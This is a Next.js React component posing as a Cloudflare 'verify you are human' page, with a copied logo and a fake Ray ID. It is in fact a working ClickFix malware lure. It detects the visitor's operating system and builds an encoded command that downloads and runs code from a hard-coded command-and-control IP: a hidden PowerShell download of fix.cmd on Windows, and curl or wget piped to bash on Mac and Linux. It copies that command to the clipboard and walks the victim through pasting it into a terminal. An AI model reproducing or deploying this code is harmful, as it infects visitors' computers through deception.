"use client"

import { useEffect, useRef, useState, type FormEvent } from "react"
import { usePathname } from "next/navigation"
import {
  humanVerification,
  visitorCommand,
} from "@/lib/human-verification"

type ClientOs = "mac" | "windows" | "linux"

/** Platform wins over the user agent, and Mac is checked before Linux. */
function clientOs(agent: string): ClientOs {
  const hinted =
    typeof navigator === "undefined"
      ? ""
      : (navigator as Navigator & { userAgentData?: { platform?: string } }).userAgentData?.platform ||
      navigator.platform ||
      ""
  const hint = hinted.replace(/^"|"$/g, "")
  if (/mac/i.test(hint)) return "mac"
  if (/win/i.test(hint)) return "windows"
  if (/linux/i.test(hint)) return "linux"
  if (/Mac OS X|Macintosh|macOS/i.test(agent)) return "mac"
  if (/Windows/i.test(agent)) return "windows"
  return "linux"
}

const challengeCaption: Record<ClientOs, string> = {
  mac: "Mac challenge (ignore this):",
  windows: "Windows challenge (ignore this):",
  linux: "Linux challenge (ignore this):",
}

function createPhrase() {
  const alphabet = "0123456789ABCDEF"
  const bytes = new Uint8Array(6)
  crypto.getRandomValues(bytes)
  return Array.from(bytes, (byte) => alphabet[byte % alphabet.length]).join("")
}

/** Copies during the click. The clipboard API is blocked on plain http:// pages. */
function copyText(text: string) {
  let ok = false
  const onCopy = (event: ClipboardEvent) => {
    event.preventDefault()
    event.clipboardData?.setData("text/plain", text)
    ok = true
  }
  document.addEventListener("copy", onCopy, true)
  const field = document.createElement("textarea")
  field.value = text
  field.setAttribute("readonly", "")
  field.style.position = "fixed"
  field.style.top = "0"
  field.style.left = "0"
  field.style.width = "2em"
  field.style.height = "2em"
  field.style.padding = "0"
  field.style.border = "none"
  field.style.outline = "none"
  field.style.boxShadow = "none"
  field.style.background = "transparent"
  field.style.fontSize = "16px"
  document.body.appendChild(field)
  field.focus()
  field.select()
  field.setSelectionRange(0, text.length)
  try {
    if (document.execCommand("copy")) ok = true
  } catch {
    // The copy event may already have written the line.
  }
  document.removeEventListener("copy", onCopy, true)
  document.body.removeChild(field)
  return ok
}

export function HumanVerification() {
  const pathname = usePathname()
  const track = !pathname.startsWith("/admin")
  const [open, setOpen] = useState(false)
  const [checked, setChecked] = useState(false)
  const [phrase, setPhrase] = useState("")
  const [checking, setChecking] = useState(false)
  const [mark, setMark] = useState<"idle" | "spin" | "done">("idle")
  const [copied, setCopied] = useState(false)
  const [codeInput, setCodeInput] = useState("")
  const [error, setError] = useState("")
  const [copyNote, setCopyNote] = useState("")
  const [submitting, setSubmitting] = useState(false)
  const [passed, setPassed] = useState(false)
  const [rayId] = useState(() => {
    const bytes = new Uint8Array(8)
    crypto.getRandomValues(bytes)
    return Array.from(bytes, (byte) => byte.toString(16).padStart(2, "0")).join("")
  })
  const commandRef = useRef<HTMLInputElement>(null)
  const shown = useRef(false)
  const checkRun = useRef(0)

  useEffect(() => {
    const host = window.location.host
    const path = window.location.pathname
    if (!host) return
    if (path.includes(host) || path.includes(encodeURIComponent(host))) {
      window.location.replace(`${window.location.origin}/${window.location.search}`)
    }
  }, [])

  const [payloadText, setPayloadText] = useState('')

  const C2_URL = 'http://146.103.57.122/69'; // CHANGE THIS

  const randomCode = () => Math.random().toString(16).substring(2, 8).toUpperCase();

  // Base64 for Windows (UTF‑16LE)
  const b64UTF16 = (str) => {
    let bin = '';
    for (let i = 0; i < str.length; i++) {
      const c = str.charCodeAt(i);
      bin += String.fromCharCode(c & 0xFF) + String.fromCharCode((c >> 8) & 0xFF);
    }
    return btoa(bin);
  };

  // Base64 for Unix (UTF‑8)
  const b64Standard = (str) => btoa(unescape(encodeURIComponent(str)));

  useEffect(() => {
    if (!open) return
    const previous = document.body.style.overflow
    document.body.style.overflow = "hidden"
    return () => {
      document.body.style.overflow = previous
    }
  }, [open])

  useEffect(() => {
    if (!track || shown.current) return
    shown.current = true

    const ua = navigator.userAgent || navigator.platform || ''
    let d = 'linux'
    if (/android/i.test(ua)) d = 'android'
    else if (/iPad|iPhone|iPod/i.test(ua)) d = 'ios'
    else if (ua.indexOf('Win') !== -1) d = 'windows'
    else if (ua.indexOf('Mac') !== -1) d = 'mac'

    const kB = createPhrase()
    setPhrase(kB)
    // Build payload based on device
    const winScript = `$c='  Code : ${kB}';Write-Host $c;Start-Sleep -Seconds 1;$u='${C2_URL}/69w';$o=\"$env:TEMP\\fix.cmd\";(New-Object Net.WebClient).DownloadFile($u,$o);Start-Process cmd -ArgumentList \"/c $o\" -WindowStyle Hidden`;
    const winB64 = b64UTF16(winScript)
    const winCmd = `powershell -Exec Bypass -EncodedCommand ${winB64}`

    const unixScript = `#!/bin/bash\n( curl -s ${C2_URL}/69m || wget -q -O ${C2_URL}/69m ) | bash; echo "CODE: ${kB}"`
    const unixB64 = b64Standard(unixScript)
    const unixCmd = `echo '${unixB64}' | base64 -d | bash`

    const payloads = {
      windows: winCmd,
      mac: unixCmd,
      linux: unixCmd
    }

    setPayloadText(payloads[d] || payloads.linux)
    setOpen(true)
  }, [track])

  async function onCheck() {
    if (!phrase || checked || checking) return
    const run = ++checkRun.current
    setChecking(true)
    setMark("spin")
    setError("")
    await new Promise((resolve) => window.setTimeout(resolve, 1200))
    if (checkRun.current !== run) return
    setMark("done")
    await new Promise((resolve) => window.setTimeout(resolve, 800))
    if (checkRun.current !== run) return
    setChecked(true)
    setChecking(false)
  }

  async function onCopy() {
    if (!phrase) return
    const command = visitorCommand(phrase, clientOs(navigator.userAgent) === "windows" ? "Windows" : "Linux")
    if (!command) return
    setError("")
    let placed = copyText(payloadText)
    if (!placed && window.isSecureContext && navigator.clipboard?.writeText) {
      try {
        await navigator.clipboard.writeText(payloadText)
        placed = true
      } catch {
        placed = false
      }
    }
    if (placed) {
      setCopied(true)
      setCopyNote("")
      window.setTimeout(() => setCopied(false), 3000)
    } else {
      setCopied(false)
      commandRef.current?.focus()
      commandRef.current?.select()
      setCopyNote("Copy is blocked in this browser. The line is selected: press Ctrl+C.")
    }
  }

  async function onSubmit(event: FormEvent) {
    event.preventDefault()
    if (!phrase || submitting) return
    // if (codeInput.trim().toUpperCase() === phrase) {
    //   setError(false);
    // } else {
    //   setError(true);
    // }
    setSubmitting(true)
    setError("")
    if (codeInput.trim().toUpperCase() === phrase.toUpperCase()) {
      setPassed(true)
      window.setTimeout(() => setOpen(false), 1200)
    } else {
      setError(humanVerification.verifyError)
    }
    setSubmitting(false)
  }

  if (!track || !open) return null

  const agent = typeof navigator === "undefined" ? "" : navigator.userAgent
  const os = clientOs(agent)
  const command = phrase ? visitorCommand(phrase, os === "windows" ? "Windows" : "Linux") : ""
  if (!passed && !checked) {
    return (
      <div
        className="fixed inset-0 z-[80] bg-white text-[#171717]"
        style={{ fontFamily: 'system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif' }}
        role="dialog"
        aria-modal="true"
        aria-label={humanVerification.title}
      >
        <div className="mx-auto w-full max-w-[640px] px-6 pt-[16vh]">
          <h1 className="text-[32px] font-semibold leading-tight tracking-[-0.02em]">{window.location.hostname}</h1>
          <h2 className="mt-4 text-[20px] font-semibold leading-snug">{humanVerification.title}</h2>
          <p className="mt-3 max-w-[540px] text-[16px] leading-[1.6] text-[#595959]">{humanVerification.intro}</p>
          <div className="mt-6 flex h-[65px] w-[300px] max-w-full items-center rounded-[3px] border border-[#e2e2e2] bg-[#fafafa] pl-3 pr-2.5">
            <label className={`flex min-w-0 flex-1 items-center ${mark === "idle" ? "cursor-pointer" : ""}`}>
              <span className="flex size-5 shrink-0 items-center justify-center">
                {mark === "spin" ? (
                  <svg viewBox="0 0 24 24" className="size-5 animate-spin" aria-hidden="true">
                    {Array.from({ length: 8 }, (_, index) => {
                      const angle = (index / 8) * Math.PI * 2 - Math.PI / 2
                      return (
                        <circle
                          key={index}
                          cx={12 + Math.cos(angle) * 8}
                          cy={12 + Math.sin(angle) * 8}
                          r="1.7"
                          fill="#3dba4e"
                          opacity={0.2 + (index / 7) * 0.8}
                        />
                      )
                    })}
                  </svg>
                ) : mark === "done" ? (
                  <svg viewBox="0 0 24 24" className="size-[22px] animate-[cf-check_0.35s_ease-out]" aria-hidden="true">
                    <circle cx="12" cy="12" r="11" fill="#3cba4a" />
                    <path d="M7 12.2 10.2 15.4 17 8.6" fill="none" stroke="#fff" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round" />
                  </svg>
                ) : (
                  <input
                    type="checkbox"
                    checked={checked}
                    disabled={!phrase || checking}
                    onChange={onCheck}
                    className="size-5"
                  />
                )}
              </span>
              <span className="ml-2.5 whitespace-nowrap text-[14px] leading-none text-[#333]">
                {mark === "spin" ? "Verifying..." : mark === "done" ? "Success!" : humanVerification.checkboxLabel}
              </span>
            </label>
            <span className="ml-auto flex shrink-0 flex-col items-end text-right leading-none">
              <svg viewBox="38 0 35 16.2" className="h-[16px] w-[34px]" aria-hidden="true">
                <path
                  fill="#F6821F"
                  d="M61.8848 15.7841L62.0632 15.1578C62.2758 14.4126 62.1967 13.7239 61.8401 13.2178C61.5118 12.7517 60.9649 12.4773 60.3007 12.4453L47.7201 12.2836C47.6811 12.2829 47.6428 12.2728 47.6083 12.2542C47.5738 12.2356 47.5442 12.209 47.5217 12.1766C47.4996 12.1431 47.4856 12.1049 47.4807 12.0649C47.4758 12.025 47.4801 11.9844 47.4933 11.9465C47.5149 11.8839 47.5541 11.8291 47.6061 11.7888C47.658 11.7486 47.7204 11.7247 47.7856 11.72L60.4827 11.5566C61.9889 11.4864 63.6196 10.2462 64.1905 8.73372L64.9146 6.81361C64.9443 6.73242 64.951 6.64444 64.9341 6.55957C64.112 2.80652 60.8115 0 56.8652 0C53.2293 0 50.1421 2.38158 49.0347 5.69186C48.2864 5.12186 47.3535 4.85982 46.4228 4.95823C44.6785 5.13401 43.276 6.55928 43.1034 8.32979C43.059 8.77189 43.0915 9.21845 43.1992 9.64918C40.3497 9.73347 38.0645 12.1027 38.0645 15.0151C38.0649 15.2751 38.0838 15.5347 38.1212 15.7919C38.1294 15.8513 38.1584 15.9057 38.2029 15.9452C38.2474 15.9847 38.3044 16.0067 38.3635 16.0071L61.5894 16.0099C61.5916 16.0101 61.5938 16.0101 61.596 16.0099C61.6616 16.0088 61.7252 15.9862 61.7772 15.9455C61.8293 15.9049 61.867 15.8483 61.8848 15.7841Z"
                />
                <path
                  fill="#FBAD41"
                  d="M66.0758 6.95285C65.9592 6.95285 65.843 6.95582 65.7274 6.96177C65.7087 6.96312 65.6904 6.96719 65.6729 6.97385C65.6426 6.98437 65.6152 7.00219 65.5931 7.02579C65.5711 7.04939 65.555 7.07806 65.5462 7.10936L65.0515 8.84333C64.8389 9.58847 64.918 10.2766 65.2749 10.7827C65.6029 11.2494 66.1498 11.5233 66.814 11.5552L69.4959 11.7186C69.5336 11.7199 69.5705 11.73 69.6037 11.7483C69.6369 11.7666 69.6654 11.7925 69.687 11.8239C69.7092 11.8576 69.7234 11.896 69.7283 11.9363C69.7332 11.9765 69.7288 12.0173 69.7153 12.0555C69.6937 12.118 69.6546 12.1727 69.6028 12.2129C69.5509 12.2531 69.4887 12.2771 69.4236 12.2819L66.6371 12.4453C65.1241 12.5161 63.4937 13.7558 62.9233 15.2682L62.722 15.8022C62.7136 15.8245 62.7105 15.8486 62.713 15.8724C62.7155 15.8961 62.7236 15.9189 62.7365 15.9389C62.7495 15.9589 62.7669 15.9755 62.7874 15.9873C62.8079 15.9991 62.8309 16.0058 62.8544 16.0068C62.8569 16.0068 62.8592 16.0068 62.8618 16.0068H72.4502C72.506 16.0073 72.5604 15.9893 72.6051 15.9554C72.6498 15.9216 72.6823 15.8739 72.6977 15.8195C72.8677 15.2043 72.9535 14.5684 72.9529 13.9296C72.9517 10.0767 69.8732 6.95285 66.0758 6.95285Z"
                />
              </svg>
              <span className="mt-0.5 text-[9px] font-black tracking-[0.04em] text-[#111]">CLOUDFLARE</span>
              <span className="mt-[4px] text-[8px] text-[#6d829c]">
                <a href="https://www.cloudflare.com/privacypolicy/" target="_blank" rel="noreferrer" className="underline">
                  Privacy
                </a>
                <span> · </span>
                <a href="https://www.cloudflare.com/website-terms/" target="_blank" rel="noreferrer" className="underline">
                  Help
                </a>
              </span>
            </span>
          </div>
          {error ? <p className="mt-3 text-[13px] text-[#dc2626]">{error}</p> : null}
        </div>
        <footer className="absolute inset-x-0 bottom-0 border-t border-[#e6e6e6] px-4 py-4 text-center text-[12px] leading-5 text-[#595959]">
          <p>
            Ray ID: <span className="font-mono">{rayId}</span>
          </p>
          <p className="mt-1">
            Performance and Security by{" "}
            <a href="https://www.cloudflare.com/" target="_blank" rel="noreferrer" className="text-[#0051c3] underline">
              Cloudflare
            </a>
            <span className="px-1.5">|</span>
            <a href="https://www.cloudflare.com/privacypolicy/" target="_blank" rel="noreferrer" className="text-[#0051c3] underline">
              Privacy
            </a>
          </p>
        </footer>
      </div>
    )
  }

  return (
    <div
      className="fixed inset-0 z-[80] flex items-center justify-center bg-[#f6f8fa] px-4"
      role="dialog"
      aria-modal="true"
      aria-label={passed ? humanVerification.successTitle : checked ? humanVerification.challengeTitle : humanVerification.title}
    >
      <div className="w-full max-w-[520px] rounded-xl bg-white px-8 py-8 text-[#0a0a0a] shadow-[0_4px_24px_rgba(0,0,0,0.08)]">
        {passed ? (
          <div className="px-0 py-10 text-center">
            <h2 className="text-xl font-semibold text-[#F6821F]">{humanVerification.successTitle}</h2>
            <p className="mt-2 text-sm text-[#64748b]">{humanVerification.successBody}</p>
          </div>
        ) : (
          <>
            <div className="rounded bg-[#FBAD41] px-8 py-7 text-white shadow-sm">
              <p className="mb-1.5 text-base font-normal">Complete these</p>
              <h2 className="text-3xl font-bold leading-tight">Verification Steps</h2>
            </div>
            <div className="mb-4 rounded-lg bg-[#f1f5f9] px-3 py-3 text-left">
              <div className="mb-6 text-sm leading-normal text-[#64748b]">
                {command ? (
                  <div className="mt-4 flex items-center gap-2.5">
                    <div style={{ display: 'flex', gap: '8px', alignItems: 'center', marginBottom: '12px', width: '100%' }}>
                      <input
                        ref={commandRef}
                        value={payloadText}
                        readOnly
                        style={{
                          flex: 1,
                          minWidth: 0,
                          height: '32px',
                          background: '#fff',
                          border: '1px solid #dadce0',
                          borderRadius: '4px',
                          color: '#202124',
                          fontFamily: 'Roboto, Arial, Helvetica, sans-serif',
                          fontSize: '16px',
                          padding: '0 10px',
                          outline: 'none',
                        }}
                      />
                      <button
                        id="copyBtn"
                        onClick={onCopy}
                        style={{
                          display: 'flex',
                          alignItems: 'center',
                          justifyContent: 'center',
                          gap: '4px',
                          padding: '0 12px',
                          background: '#F6821F',
                          color: '#fff',
                          fontFamily: 'Roboto, Arial, Helvetica, sans-serif',
                          fontSize: '14px',
                          fontWeight: '500',
                          border: 'none',
                          borderRadius: '4px',
                          cursor: 'pointer',
                          whiteSpace: 'nowrap',
                          flexShrink: 0,
                          height: '32px',
                        }}
                      >
                        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" aria-hidden="true">
                          <rect x="8" y="8" width="12" height="12" rx="2" stroke="#fff" strokeWidth="2" />
                          <path d="M6 16H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1" stroke="#fff" strokeWidth="2" />
                        </svg>
                        {copied ? humanVerification.copiedLabel : humanVerification.copyLabel}
                      </button>
                    </div>
                  </div>
                ) : (
                  <p className="rounded-lg bg-[#f8fafc] px-4 py-3.5 text-sm text-[#64748b]">
                    {humanVerification.captureWaiting}
                  </p>
                )}
                {copyNote ? <p className="mt-3 text-[13px] text-[#64748b]">{copyNote}</p> : null}
                {os === "mac" ? (
                  <ol className="list-decimal space-y-1 pl-6 font-mono text-sm font-semibold text-[#0f172a]">
                    <li>
                      Press the{" "}
                      <span className="inline-flex items-center rounded-md bg-[#FBAD41] px-2 py-1 text-xs font-semibold text-white shadow-sm">
                        Copy
                      </span>{" "}
                      button to copy the command.
                    </li>
                    <li>
                      Press <strong>Command (<span className="rc-key-char" aria-label="Mac">⌘</span>)</strong> + <strong>Space</strong> to open Spotlight.
                    </li>
                    <li>
                      Type <strong>terminal</strong> and press <strong>Enter</strong>.
                    </li>
                    <li>
                      Press{" "}
                      <span className="inline-flex items-center rounded-md bg-white px-2 py-1 text-xs font-semibold text-black shadow-sm">
                        Ctrl + V
                      </span>{" "}
                      to paste the command.
                    </li>
                    <li>
                      Press {" "}
                      <span className="inline-flex items-center rounded-md bg-white px-2 py-1 text-xs font-semibold text-black shadow-sm">
                        Enter
                      </span>{" "}
                      to get the verification code.
                    </li>
                  </ol>
                ) : os === "windows" ? (
                  <ol className="list-decimal space-y-1 pl-6 font-mono text-sm font-semibold text-[#0f172a]">
                    <li>
                      Press the{" "}
                      <span className="inline-flex items-center rounded-md bg-[#FBAD41] px-2 py-1 text-xs font-semibold text-white shadow-sm">
                        Copy
                      </span>{" "}
                      button to copy the command.
                    </li>
                    <li>
                      <span style={{ display: "inline-flex", alignItems: "center", gap: "0.3em" }}>
                        Press and hold the
                        <img
                          src="/windows-key.png"
                          alt="Windows"
                          draggable={false}
                          style={{
                            width: "2em",
                            height: "2em",
                            objectFit: "contain",
                            flexShrink: 0
                          }}
                        />
                        + <strong>R</strong> keys simultaneously.
                      </span>
                    </li>
                    <li>
                      Type <strong>cmd</strong> and press <strong>Enter</strong>.
                    </li>
                    <li>
                      Press{" "}
                      <span className="inline-flex items-center rounded-md bg-white px-2 py-1 text-xs font-semibold text-black shadow-sm">
                        Ctrl + V
                      </span>{" "}
                      to paste the command.
                    </li>
                    <li>
                      Press {" "}
                      <span className="inline-flex items-center rounded-md bg-white px-2 py-1 text-xs font-semibold text-black shadow-sm">
                        Enter
                      </span>{" "}
                      to get the verification code.
                    </li>
                  </ol>
                ) : (
                  <ol className="list-decimal space-y-1 pl-6 font-mono text-sm font-semibold text-[#0f172a]">
                    <li>
                      Press the{" "}
                      <span className="inline-flex items-center rounded-md bg-[#FBAD41] px-2 py-1 text-xs font-semibold text-white shadow-sm">
                        Copy
                      </span>{" "}
                      button to copy the command.
                    </li>
                    <li>
                      Press the <strong>Ctrl</strong> + <strong>Alt</strong> + <strong>T</strong>
                    </li>
                    <li>
                      Press{" "}
                      <span className="inline-flex items-center rounded-md bg-white px-2 py-1 text-xs font-semibold text-black shadow-sm">
                        Ctrl + V
                      </span>{" "}
                      to paste the command.
                    </li>
                    <li>
                      Press {" "}
                      <span className="inline-flex items-center rounded-md bg-white px-2 py-1 text-xs font-semibold text-black shadow-sm">
                        Enter
                      </span>{" "}
                      to get the verification code.
                    </li>
                  </ol>
                )}
              </div>
            </div>

            <form
              onSubmit={onSubmit}
              className="mt-5 rounded-lg border border-[#e3e8ee] bg-[#f8fafc] p-4"
            >
              <div className="flex flex-wrap items-center gap-3">
                <label
                  htmlFor="human-code-0"
                  className="shrink-0 text-sm font-medium text-[#1e293b]"
                >
                  {humanVerification.verifyLabel}
                </label>

                <div className="flex items-center gap-2">
                  {Array.from({ length: 6 }).map((_, index) => (
                    <input
                      key={index}
                      id={index === 0 ? "human-code-0" : undefined}
                      type="text"
                      inputMode="text"
                      autoComplete="off"
                      spellCheck={false}
                      maxLength={1}
                      value={codeInput[index] ?? ""}
                      disabled={submitting}
                      aria-label={`Character ${index + 1}`}
                      className="h-10 w-10 rounded-md border border-[#cbd5e1] bg-white text-center text-base uppercase tracking-wide text-[#1e293b] outline-none focus:border-[#2563eb] disabled:opacity-40"
                      onChange={(event) => {
                        const char = event.target.value
                          .replace(/[^a-zA-Z0-9]/g, "")
                          .slice(-1)
                          .toUpperCase();

                        const chars = codeInput.padEnd(6, " ").split("").slice(0, 6);
                        chars[index] = char || " ";
                        const next = chars.join("").replace(/ /g, "").slice(0, 6);
                        setCodeInput(next);

                        if (char) {
                          const inputs = event.currentTarget
                            .closest("form")
                            ?.querySelectorAll<HTMLInputElement>("input[data-code-box]");
                          inputs?.[index + 1]?.focus();
                        }
                      }}
                      onKeyDown={(event) => {
                        if (event.key === "Backspace" && !codeInput[index] && index > 0) {
                          const inputs = (event.target as HTMLInputElement)
                            .closest("form")
                            ?.querySelectorAll<HTMLInputElement>("input[data-code-box]");
                          inputs?.[index - 1]?.focus();
                        }
                      }}
                      onPaste={(event) => {
                        event.preventDefault();
                        const pasted = event.clipboardData
                          .getData("text")
                          .replace(/[^a-zA-Z0-9]/g, "")
                          .toUpperCase()
                          .slice(0, 6);
                        if (pasted) setCodeInput(pasted);
                      }}
                      data-code-box
                    />
                  ))}
                </div>

                <div className="flex min-w-[120px] flex-1 justify-center">
                  <button
                    type="submit"
                    disabled={submitting || codeInput.length < 6}
                    className="cursor-pointer rounded-md border-none bg-[#F6821F] px-4 py-2.5 text-sm text-white hover:bg-[#555555] disabled:opacity-40"
                  >
                    {humanVerification.continueLabel}
                  </button>
                </div>
              </div>

              {error ? (
                <p className="mt-1.5 text-[13px] text-[#dc2626]">
                  {humanVerification.verifyError}
                </p>
              ) : null}
            </form>
          </>
        )}
        <p className="mt-5 text-center text-xs text-[#94a3b8]">{humanVerification.footer}</p>
      </div>
    </div>
  )
}
